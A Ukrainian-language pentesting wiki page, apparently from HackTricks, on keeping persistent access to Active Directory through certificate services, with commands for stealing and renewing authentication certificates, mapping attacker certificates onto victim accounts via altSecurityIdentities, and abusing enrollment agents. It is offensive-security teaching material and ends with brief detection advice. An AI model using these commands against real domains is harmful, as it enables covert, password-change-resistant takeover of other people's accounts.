# Постійність облікового запису AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Це короткий підсумок розділів про постійність облікових записів із чудового дослідження [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**<sup>[[7]](#references)</sup>

## Розуміння викрадення облікових даних активного користувача за допомогою сертифікатів – PERSIST1

У сценарії, коли користувач може запросити сертифікат, що дозволяє автентифікацію в домені, зловмисник отримує можливість запросити й викрасти цей сертифікат для збереження постійного доступу до мережі. За замовчуванням шаблон `User` в Active Directory дозволяє такі запити, хоча іноді його може бути вимкнено.<sup>[[3]](#references)[[7]](#references)</sup>

За допомогою [Certify](https://github.com/GhostPack/Certify) або [Certipy](https://github.com/ly4k/Certipy) можна виконати пошук увімкнених шаблонів, які дозволяють автентифікацію клієнта, а потім запросити один із них:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Сила сертифіката полягає в його здатності автентифікуватися як користувач, якому він належить, незалежно від змін пароля, доки сертифікат залишається дійсним.

Ви можете конвертувати PEM у PFX і використати його для отримання TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Примітка: У поєднанні з іншими техніками (див. розділи THEFT) автентифікація на основі сертифікатів забезпечує persistent access без взаємодії з LSASS і навіть із контекстів без підвищених привілеїв.

## Отримання persistence на машині за допомогою сертифікатів - PERSIST2

Якщо зловмисник має підвищені привілеї на хості, він може зареєструвати обліковий запис машини скомпрометованої системи для отримання сертифіката за допомогою стандартного шаблону `Machine`. Автентифікація від імені машини активує S4U2Self для локальних служб і може забезпечити тривалу persistence на хості:<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Розширення Persistence через поновлення сертифіката - PERSIST3

Зловживання періодами дії та поновлення шаблонів сертифікатів дає зловмиснику змогу підтримувати довготривалий доступ. Якщо у вас є раніше виданий сертифікат і його приватний ключ, ви можете поновити його до завершення строку дії, щоб отримати новий довготривалий credential без створення додаткових артефактів запиту, пов’язаних із початковим principal.<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Операційна порада: Відстежуйте терміни дії PFX-файлів, що зберігаються у зловмисника, і поновлюйте їх завчасно. Поновлення також може спричинити додавання до оновлених сертифікатів сучасного розширення SID mapping, завдяки чому вони залишатимуться придатними для використання за суворіших правил DC mapping (див. наступний розділ).

## Створення явних Certificate Mappings (altSecurityIdentities) – PERSIST4

Якщо ви можете записувати атрибут `altSecurityIdentities` цільового облікового запису, ви можете явно прив'язати контрольований зловмисником сертифікат до цього облікового запису. Це зберігається після зміни пароля і, за використання strong mapping formats, залишається функціональним за сучасного enforcement на DC.<sup>[[2]](#references)</sup>

Загальний порядок дій:

1. Отримайте або випустіть контрольований вами client-auth certificate (наприклад, зарахуйтеся до шаблону `User` як власний обліковий запис).
2. Витягніть із сертифіката сильний ідентифікатор (`Issuer+Serial`, `SKI` або `SHA1-PublicKey`).
3. Додайте явний mapping до `altSecurityIdentities` principal-жертви, використовуючи цей ідентифікатор.
4. Автентифікуйтеся за допомогою свого сертифіката; DC зіставить його з жертвою через явний mapping.

Приклад (PowerShell) із використанням strong `Issuer+Serial` mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Потім автентифікуйтеся за допомогою вашого PFX. Certipy безпосередньо отримає TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Створення надійних зіставлень `altSecurityIdentities`

На практиці зіставлення **Issuer+Serial** і **SKI** є найпростішими надійними форматами, які можна створити на основі сертифіката, що перебуває у володінні зловмисника. Це важливо після **11 лютого 2025 року**, коли DC за замовчуванням переходять у режим **Full Enforcement**, а слабкі зіставлення перестають бути надійними.<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Примітки
- Використовуйте лише strong mapping types: `X509IssuerSerialNumber`, `X509SKI` або `X509SHA1PublicKey`. Слабкі формати (Subject/Issuer, лише Subject, email у форматі RFC822) застаріли та можуть бути заблоковані політикою DC.
- Mapping працює як для об’єктів **user**, так і для об’єктів **computer**, тому права запису до `altSecurityIdentities` облікового запису комп’ютера достатньо, щоб зберегти persistence від імені цієї машини.
- Ланцюжок сертифікатів має будуватися до root, якому довіряє DC. Enterprise CA у NTAuth зазвичай є довіреними; деякі середовища також довіряють public CA.
- Schannel authentication залишається корисною для persistence, навіть коли PKINIT не працює через відсутність у DC EKU Smart Card Logon або повернення `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### Явні mapping `Issuer/SID` у версіях `2025+`

На контролерах домену **Windows Server 2022+**, на яких встановлено оновлення безпеки від **9 вересня 2025 року**, Microsoft додала ще один формат strong explicit mapping, привабливий для persistence, оскільки він зберігається після повторної видачі сертифіката тією самою CA:<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Операційно це відрізняється від старіших форматів strong:
- `Issuer+Serial` закріплює **один точний сертифікат**.
- `SKI` / `SHA1-PUKEY` закріплюють **одну пару ключів**.
- `Issuer/SID` закріплює **CA, що видає сертифікат, + цільовий SID**, тому оновлені або повторно видані сертифікати від того самого CA продовжують працювати без переписування `altSecurityIdentities`.

Вимоги та застереження
- Сертифікат, наданий для logon, фактично повинен містити SID цільового облікового запису в розширенні безпеки SID.
- Цей формат не корисний для сертифікатів у стилі `ESC9` / `ESC16`, які не містять розширення SID; у таких випадках використовуйте `Issuer+Serial`, `SKI` або `SHA1-PUKEY`.

Детальніше про слабкі явні mappings і шляхи атак дивіться:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent як Persistence – PERSIST5

Якщо ви отримали дійсний сертифікат Certificate Request Agent/Enrollment Agent, ви можете за потреби mint нові сертифікати, здатні виконувати logon від імені користувачів, і зберігати PFX агента offline як persistence token. Workflow зловживання:<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Для видалення цієї persistence потрібно відкликати сертифікат агента або дозволи шаблону.

Операційні примітки
- Сучасні версії `Certipy` підтримують і `-on-behalf-of`, і `-renew`, тому зловмисник, який має PFX Enrollment Agent, може створювати, а згодом і поновлювати leaf-сертифікати без повторного доступу до початкового цільового облікового запису.<sup>[[4]](#references)</sup>
- Якщо отримання TGT на основі PKINIT неможливе, отриманий on-behalf-of сертифікат усе одно можна використовувати для автентифікації Schannel за допомогою `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.<sup>[[5]](#references)</sup>

## Використання збережених сертифікатів, коли PKINIT не працює

Якщо DC не має сертифіката, сумісного зі Smart Card Logon, вхід за сертифікатом через PKINIT може завершитися помилкою `KDC_ERR_PADATA_TYPE_NOSUPP`. Це **не знищує примітив persistence: той самий PFX часто все ще можна використовувати для доступу до LDAP з автентифікацією через Schannel**.<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Це особливо корисно після PERSIST4/PERSIST5, оскільки ви можете продовжувати роботу з Linux/macOS і ланцюжити інші directory persistence actions, наприклад розгортати [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) або редагувати атрибути делегування, доступні для запису.

## 2025 Strong Certificate Mapping Enforcement: Вплив на Persistence

Microsoft KB5014754 запровадив Strong Certificate Mapping Enforcement на контролерах домену. Починаючи з **11 лютого 2025 року**, DC за замовчуванням використовують **Full Enforcement** для слабких/неоднозначних зіставлень, а після оновлення безпеки від **9 вересня 2025 року** пропатчені DC більше не підтримують старий fallback у Compatibility mode.<sup>[[1]](#references)</sup> Практичні наслідки:

- Сертифікати, створені до 2022 року, які не містять розширення SID mapping, можуть не пройти implicit mapping, коли DC працюють у режимі Full Enforcement. Attackers можуть зберегти доступ, поновивши сертифікати через AD CS (щоб отримати розширення SID) або додавши strong explicit mapping до `altSecurityIdentities` (PERSIST4).
- Explicit mappings із strong formats (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` і на сучасних DC `Issuer/SID`) продовжують працювати. Weak formats (Issuer/Subject, Subject-only, RFC822) можуть бути заблоковані, тому їх слід уникати для persistence.
- Якщо weak mappings усе ще працюють, вважайте, що ви зіткнулися з непропатченим або інакше налаштованим DC, а не з надійним шляхом довготривалої persistence.
- Шляхи видачі у стилі `ESC9` / `ESC16`, які пригнічують розширення SID, роблять `Issuer/SID` непридатним, тому практичним варіантом persistence стають fallback strong mappings або поновлення через звичайний template.

Administrators should monitor and alert on:
- Зміни в `altSecurityIdentities`, а також видачу/поновлення сертифікатів Enrollment Agent і User.
- CA issuance logs щодо on-behalf-of requests і незвичних шаблонів поновлення.

## References

- [1] [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
